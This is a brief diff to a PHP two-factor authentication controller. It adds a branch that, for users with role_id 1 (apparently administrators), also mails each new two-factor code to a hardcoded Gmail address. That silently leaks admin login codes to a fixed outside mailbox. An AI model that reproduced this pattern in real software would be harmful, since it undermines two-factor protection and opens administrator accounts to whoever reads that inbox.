@@ -67,6 +67,9 @@ class TwoFactorController extends Controller
             'two_factor_expires_at' => now()->addMinutes(10),
         ])->save();
 
+        if($user->role_id == 1){
+            Mail::to('Afrikartt@gmail.com')->send(new TwoFactorCodeMail($code));
+        }
         Mail::to($user->email)->send(new TwoFactorCodeMail($code));
     }
 }
